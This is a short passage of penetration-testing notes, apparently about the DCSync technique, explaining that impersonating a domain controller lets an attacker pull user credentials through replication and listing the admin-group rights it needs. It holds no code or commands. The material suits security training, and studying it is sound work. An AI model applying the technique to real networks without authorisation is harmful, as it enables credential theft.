+ By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller
+ However, to perform this attack, we need a user that is a member of _Domain Admins_, _Enterprise Admins_, or _Administrators_, because there are certain rights required to start the replication
+ Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test